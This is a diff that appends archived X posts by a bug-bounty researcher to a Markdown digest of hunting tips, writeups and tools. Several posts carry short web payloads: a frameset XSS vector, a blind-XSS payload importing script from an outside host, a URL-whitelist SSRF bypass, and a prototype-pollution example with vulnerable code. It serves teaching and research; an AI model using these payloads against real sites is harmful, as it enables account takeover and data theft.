@@ -2,9 +2,9 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 109
-- Conversations/threads: 94
-- Oldest post captured: 2026-01-14
+- Posts in this file: 132
+- Conversations/threads: 117
+- Oldest post captured: 2025-09-15
 - Newest post captured: 2026-11-05
 
 
@@ -2042,3 +2042,553 @@ Tags (automatic): AI-assisted hunting
 > https://github.com/repplus/rep/
 
 **Links in post:** https://github.com/repplus/rep/
+
+
+---
+
+## 2026-01-09 · Post · A researcher found an IDOR in Firefox allowing arbitrary account deletion via email. Initially, tria
+
+
+Tags (automatic): IDOR / BOLA, Platform: HackerOne
+
+
+### Post — @0xacb — 2026-01-09 20:37 UTC (2026-01-09 21:37 WAT)
+
+- URL: https://x.com/0xacb/status/2009726215804854728
+- Metrics (at fetch): not returned
+
+> A researcher found an IDOR in Firefox allowing arbitrary account deletion via email. Initially, triage said this was unexploitable since an attacker can’t access the victim's password hash, which is required for account deletion.
+>
+> But the researcher showed that for SSO users, the password hash check could be bypassed using the attacker's session. I guess the password-related DB values were None/NULL, causing the bug. Super interesting.
+>
+> Always check SSO edge cases!
+>
+> Full report👇
+> https://hackerone.com/reports/3154983
+
+**Links in post:** https://hackerone.com/reports/3154983
+
+
+---
+
+## 2026-01-08 · Post · Very nice writeup by @J0R1AN
+
+
+Tags (automatic): XSS
+
+
+### Post — @0xacb — 2026-01-08 15:33 UTC (2026-01-08 16:33 WAT)
+
+- URL: https://x.com/0xacb/status/2009287334844350760
+- Metrics (at fetch): not returned
+
+> Very nice writeup by @J0R1AN
+>
+> https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/1225
+
+**Links in post:** https://jorianwoltjer.com/blog/p/ctf/intigriti-xss-challenge/1225
+
+
+---
+
+## 2026-01-07 · Post · When everything is critical nothing is critical https://twitter.com/galnagli/status/2008821918334357
+
+
+### Post — @0xacb — 2026-01-07 13:34 UTC (2026-01-07 14:34 WAT)
+
+- URL: https://x.com/0xacb/status/2008894929771106370
+- Metrics (at fetch): not returned
+
+> When everything is critical nothing is critical https://twitter.com/galnagli/status/2008821918334357598
+
+**Links in post:** https://twitter.com/galnagli/status/2008821918334357598
+
+**Quoted post (full text):**
+
+    #### Quoted post — @galnagli — 2026-01-07 08:44 UTC (2026-01-07 09:44 WAT)
+    
+    - URL: https://x.com/galnagli/status/2008821918334357598
+    - Metrics (at fetch): not returned
+    
+    > 🤡 CVE-2026-21877 - 10.0 CVSS for AUTHENTICATED Remote code execution in @n8n_io, what a joke.... 
+    >
+    > This is the reason there are so many real risks to be found because of stupid scoring frameworks and compliance requirements
+    
+    **Media:**
+    - media `3_2008821372949069824` (details not returned by the API)
+    
+
+
+---
+
+## 2026-01-06 · Post · Self-hosted programs to hack on 👀
+
+
+### Post — @0xacb — 2026-01-06 09:26 UTC (2026-01-06 10:26 WAT)
+
+- URL: https://x.com/0xacb/status/2008470180926476793
+- Metrics (at fetch): not returned
+
+> Self-hosted programs to hack on 👀
+>
+> https://www.bugbountydirectory.com/programs
+
+**Links in post:** https://www.bugbountydirectory.com/programs
+
+
+---
+
+## 2026-01-05 · Post · If you’re tired of encountering AI slop blogs, this one’s for you.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @0xacb — 2026-01-05 10:02 UTC (2026-01-05 11:02 WAT)
+
+- URL: https://x.com/0xacb/status/2008116863906074923
+- Metrics (at fetch): not returned
+
+> If you’re tired of encountering AI slop blogs, this one’s for you.
+>
+> @busf4ctor made cool website that has a curated collection of bug bounty resources.
+>
+> Check it out👇
+> https://bugbountydaily.com/
+
+**Links in post:** https://bugbountydaily.com/
+
+
+---
+
+## 2026-01-01 · Post · If an HTML injection occurs before the body tag, framesets can be used for XSS.
+
+
+Tags (automatic): XSS
+
+
+### Post — @0xacb — 2026-01-01 14:30 UTC (2026-01-01 15:30 WAT)
+
+- URL: https://x.com/0xacb/status/2006734788678365461
+- Metrics (at fetch): not returned
+
+> If an HTML injection occurs before the body tag, framesets can be used for XSS.
+>
+> An XSS vector by @J0R1AN:
+>
+> &lt;frameset&gt;&lt;frame src="javascript:alert(origin)"&gt;&lt;/frameset&gt;
+>
+> https://lab.ctbb.show/research/html-facts-input-image-frame-xss
+
+**Links in post:** https://lab.ctbb.show/research/html-facts-input-image-frame-xss
+
+
+---
+
+## 2025-12-31 · Post · Stumbled upon this cool tool, a repeater for Chrome.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @0xacb — 2025-12-31 10:03 UTC (2025-12-31 11:03 WAT)
+
+- URL: https://x.com/0xacb/status/2006305174856360152
+- Metrics (at fetch): not returned
+
+> Stumbled upon this cool tool, a repeater for Chrome.
+>
+> Rep+ is a Burp-style repeater extension with built-in AI for quick attack suggestions, very handy for BB hunters.
+>
+> It can also extract secrets and endpoints from JS files. Cool stuff by @BourAbdelhadi
+>
+> Check it out
+> https://github.com/repplus/rep/
+
+**Links in post:** https://github.com/repplus/rep/
+
+
+---
+
+## 2025-12-16 · Post · This is really cool writeup.
+
+
+Tags (automatic): XSS, Account takeover
+
+
+### Post — @0xacb — 2025-12-16 16:02 UTC (2025-12-16 17:02 WAT)
+
+- URL: https://x.com/0xacb/status/2000959614850863288
+- Metrics (at fetch): not returned
+
+> This is really cool writeup.
+>
+> Self-XSS + Login CSRF + SSO gadget to ATO
+>
+> Nice find @_lauritz_!
+>
+> https://security.lauritz-holtmann.de/post/xss-ato-gadgets
+
+**Links in post:** https://security.lauritz-holtmann.de/post/xss-ato-gadgets
+
+
+---
+
+## 2025-12-13 · Post · &lt;svg/onload=import(‘//xss.site’)&gt;
+
+
+Tags (automatic): XSS
+
+
+### Post — @0xacb — 2025-12-13 17:30 UTC (2025-12-13 18:30 WAT)
+
+- URL: https://x.com/0xacb/status/1999894712652533913
+- Metrics (at fetch): not returned
+
+> &lt;svg/onload=import(‘//xss.site’)&gt;
+>
+> @NahamSec explains how he wisely sends his blind XSS payloads that yielded him massive bounties.👇
+>
+> https://www.youtube.com/watch?v=QSiXHb97E1c
+
+**Links in post:** https://www.youtube.com/watch?v=QSiXHb97E1c
+
+
+---
+
+## 2025-12-11 · Post · If you’re into XSS, this is a must read.
+
+
+Tags (automatic): XSS
+
+
+### Post — @0xacb — 2025-12-11 18:02 UTC (2025-12-11 19:02 WAT)
+
+- URL: https://x.com/0xacb/status/1999177939145863657
+- Metrics (at fetch): not returned
+
+> If you’re into XSS, this is a must read.
+>
+> This blog by Huli (@aszx87410) goes deep into everything about XSS. Very substantial series of a content.
+>
+> Read at: https://aszx87410.github.io/beyond-xss/en/ch1/browser-security-model/
+
+**Links in post:** https://aszx87410.github.io/beyond-xss/en/ch1/browser-security-model/
+
+
+---
+
+## 2025-12-09 · Post · Crazy XSS chain. Very impressive find by @H4R3L, @BrunoModificato and @sudhanshur705
+
+
+Tags (automatic): XSS, Account takeover
+
+
+### Post — @0xacb — 2025-12-09 16:30 UTC (2025-12-09 17:30 WAT)
+
+- URL: https://x.com/0xacb/status/1998430112853708864
+- Metrics (at fetch): not returned
+
+> Crazy XSS chain. Very impressive find by @H4R3L, @BrunoModificato and @sudhanshur705
+>
+> Read at👇
+>
+>  https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html
+
+**Links in post:** https://nokline.github.io/bugbounty/2024/06/07/Zoom-ATO.html
+
+
+---
+
+## 2025-11-27 · Post · While playing the Hack lu CTF 2025 with @xstf_team, I was able to solve a 0day challenge: a new bypa
+
+
+Tags (automatic): XSS, Account takeover
+
+
+### Post — @0xacb — 2025-11-27 14:08 UTC (2025-11-27 15:08 WAT)
+
+- URL: https://x.com/0xacb/status/1994045652653785262
+- Metrics (at fetch): not returned
+
+> While playing the Hack lu CTF 2025 with @xstf_team, I was able to solve a 0day challenge: a new bypass for a previous Grafana CVE, resulting in XSS and Account Takeover!
+>
+> Thanks @msanft for creating the challenge and the original discovery of this bypass.
+>
+> Read my technical deep dive👇
+>
+> https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive
+
+**Links in post:** https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive
+
+
+---
+
+## 2025-11-24 · Post · Want to learn about how a fascinating XSS vulnerability found by @ethiack engine led to an interesti
+
+
+Tags (automatic): XSS
+
+
+### Post — @0xacb — 2025-11-24 14:02 UTC (2025-11-24 15:02 WAT)
+
+- URL: https://x.com/0xacb/status/1992957117506986113
+- Metrics (at fetch): not returned
+
+> Want to learn about how a fascinating XSS vulnerability found by @ethiack engine led to an interesting rabbit hole of bypassing WAFs and parameter injection?
+>
+> Read the blog post here 👇
+> https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution
+
+**Links in post:** https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution
+
+
+---
+
+## 2025-11-21 · Post · The @amrelsagaei's JWT Analyzer @caido plugin is super cool.
+
+
+### Post — @0xacb — 2025-11-21 10:34 UTC (2025-11-21 11:34 WAT)
+
+- URL: https://x.com/0xacb/status/1991817370654957730
+- Metrics (at fetch): not returned
+
+> The @amrelsagaei's JWT Analyzer @caido plugin is super cool.
+>
+> It will decode the JWT for you and let you try common attack vectors. [pic.x.com/eoocf0B08f]
+
+**Media:**
+- video:  — no alt text provided by author
+
+
+---
+
+## 2025-11-18 · Post · Confused about how the Cookie SameSite attribute works?
+
+
+### Post — @0xacb — 2025-11-18 10:03 UTC (2025-11-18 11:03 WAT)
+
+- URL: https://x.com/0xacb/status/1990722612524118130
+- Metrics (at fetch): not returned
+
+> Confused about how the Cookie SameSite attribute works?
+>
+> - SameSite=None: all cross-site requests will include the cookie; if no other protections are in place, opens up the site to CSRF attacks
+>
+> - SameSite=Lax: only GET requests triggered by a top-level navigation will include the cookie; very common, harder to exploit, could still be exploitable if there's any state-changing GET requests
+>
+> - SameSite=Strict: no cross-site requests will include the cookie
+>
+> Sometimes, we can simply search for SameSite=None in all responses to check for session cookies that may be misconfigured.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G6B3jMSXoAAAPH3.jpg — no alt text provided by author
+
+
+---
+
+## 2025-11-10 · Post · When testing GraphQL APIs make sure to run graphw00f (https://github.com/dolevf/graphw00f) to finger
+
+
+### Post — @0xacb — 2025-11-10 11:52 UTC (2025-11-10 12:52 WAT)
+
+- URL: https://x.com/0xacb/status/1987850856180432944
+- Metrics (at fetch): not returned
+
+> When testing GraphQL APIs make sure to run graphw00f (https://github.com/dolevf/graphw00f) to fingerprint the specific GraphQL implementation the application is running. Then you can review the Threat Matrix to get likely attack vectors. [pic.x.com/X2oxOSWJGl]
+
+**Media:**
+- video:  — no alt text provided by author
+
+**Links in post:** https://github.com/dolevf/graphw00f
+
+
+---
+
+## 2025-11-06 · Post · If you found a package.json file in the wild, you might find some internal packages vulnerable to a 
+
+
+Tags (automatic): Dependency confusion / supply chain, Blockchain / L1-L2 / bridge
+
+
+### Post — @0xacb — 2025-11-06 10:07 UTC (2025-11-06 11:07 WAT)
+
+- URL: https://x.com/0xacb/status/1986374770233847900
+- Metrics (at fetch): not returned
+
+> If you found a package.json file in the wild, you might find some internal packages vulnerable to a dependency confusion attack 👀
+>
+> Check for it quicker using this cool new tool by JSMon: https://app.jsmon.sh/tools/npm-validator 👇 [pic.x.com/TPkPd2VlyN]
+
+**Media:**
+- video:  — no alt text provided by author
+
+**Links in post:** https://app.jsmon.sh/tools/npm-validator
+
+
+---
+
+## 2025-11-04 · Post · Looking into a potential SSRF or OR but the server checks against a URL whitelist?
+
+
+Tags (automatic): SSRF
+
+
+### Post — @0xacb — 2025-11-04 09:37 UTC (2025-11-04 10:37 WAT)
+
+- URL: https://x.com/0xacb/status/1985642642403676488
+- Metrics (at fetch): not returned
+
+> Looking into a potential SSRF or OR but the server checks against a URL whitelist?
+>
+> Try the backslash trick! Due to a difference in URL specifications, some parsers will treat '\' the same as '/', while others will not.
+>
+> Here's an example payload: https://<attacker-url>\@<whitelisted-url>/
+
+
+---
+
+## 2025-11-04 · Post · Looking into a potential SSRF or OR but the server checks against a URL whitelist?
+
+
+Tags (automatic): SSRF
+
+
+### Post — @0xacb — 2025-11-04 09:37 UTC (2025-11-04 10:37 WAT)
+
+- URL: https://x.com/0xacb/status/1985642517140799684
+- Metrics (at fetch): not returned
+
+> Looking into a potential SSRF or OR but the server checks against a URL whitelist?
+>
+> Try the backslash trick! Due to a difference in URL specifications, some parsers will treat '\' the same as '/', while others will not.
+>
+> Here's an example payload: https://<attacker-url>\@<whitelisted-url>/
+>
+> You can also use https://github.com/0xacb/recollapse to find potential new vectors 🥷
+
+**Links in post:** https://github.com/0xacb/recollapse
+
+
+---
+
+## 2025-10-24 · Post · Prototype pollution is often missed.
+
+
+Tags (automatic): XSS
+
+
+### Post — @0xacb — 2025-10-24 11:06 UTC (2025-10-24 12:06 WAT)
+
+- URL: https://x.com/0xacb/status/1981678594523804119
+- Metrics (at fetch): not returned
+
+> Prototype pollution is often missed.
+> Here's how to find it.
+>
+> Prototype pollution is a powerful client-side vulnerability that can lead to XSS.
+>
+> The main requirements to exploit it are:
+> - Unsafe parsing of user-controlled objects (via URL parameters, JSON, postMessages, etc.)
+> - A function that doesn’t isolate/protect inputs from prototype pollution and then..
+> - ..passes the input into a sink which can be used for malicious purposes
+>
+> Consider this unsafe object merging function:
+>
+> function recursivelyMerge(target, source) {
+>           for (const key in source) {
+>
+>             if (isAnObject(target) && isAnObject(source)) {
+>               recursivelyMerge(target[key], source[key]);
+>             } else {
+>               target[key] = source[key];
+>             }
+>           }
+>         }
+>
+> With this postMessage handler:
+>
+>     window.onmessage = function(event) {
+>         const postedData = JSON.parse(http://event.data);
+>         recursivelyMerge(someIrrelevantAppSettings, postedData);
+>     };
+>
+> And this as the sink:
+> let superSecretConfig = {};
+> eval(superSecretConfig.someSuperSecretJS);
+>
+> And then, by sending a postMessage like this…
+> vulnerableWindow.postMessage(‘{“__proto__”:{“someSuperSecretJS”:”alert(1)”}}’);
+> …, the attacker pollutes the Object.prototype, so every single object that doesn’t have this property explicitly defined, is going to inherit whatever value the attacker provided
+>
+> Here’s a Portswigger prototype pollution lab walkthrough 👇
+>
+> Try it yourself: https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
+
+**Media:**
+- video:  — no alt text provided by author
+
+**Links in post:** http://event.data, https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
+
+
+---
+
+## 2025-10-21 · Post · Found an XSS but got blocked by the CSP?
+
+
+Tags (automatic): XSS, CSP / CSPT
+
+
+### Post — @0xacb — 2025-10-21 09:16 UTC (2025-10-21 10:16 WAT)
+
+- URL: https://x.com/0xacb/status/1980563738420781169
+- Metrics (at fetch): not returned
+
+> Found an XSS but got blocked by the CSP?
+>
+> https://cspbypass.com has a compiled list of ways to bypass the Content-Security Policy. Check out the video below 👇 [pic.x.com/hB2utPXQOX]
+
+**Media:**
+- video:  — no alt text provided by author
+
+**Links in post:** https://cspbypass.com
+
+
+---
+
+## 2025-10-20 · Post · If your hacking method looks like everyone else’s, so will your findings. My advice is to get weird.
+
+
+### Post — @0xacb — 2025-10-20 09:28 UTC (2025-10-20 10:28 WAT)
+
+- URL: https://x.com/0xacb/status/1980204421377048611
+- Metrics (at fetch): not returned
+
+> If your hacking method looks like everyone else’s, so will your findings. My advice is to get weird.
+>
+> Bug bounty wins come from being different. Everyone checks the basics. You need to hunt the edges, the overlooked, the strange. Go past the checklist, and you'll land what others miss.
+
+
+---
+
+## 2025-09-15 · Post · If you look at the AI-generated code below, you may notice that path traversal is prevented via base
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @0xacb — 2025-09-15 09:03 UTC (2025-09-15 10:03 WAT)
+
+- URL: https://x.com/0xacb/status/1967514562753638862
+- Metrics (at fetch): not returned
+
+> If you look at the AI-generated code below, you may notice that path traversal is prevented via basename functions.
+>
+> Can you still exploit it?
+>
+> Try here 👉 https://ai4eh.ethiack.ninja [pic.x.com/zpdHkUyOef]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G04D8htXoAAd7UG.jpg — no alt text provided by author
+
+**Links in post:** https://ai4eh.ethiack.ninja
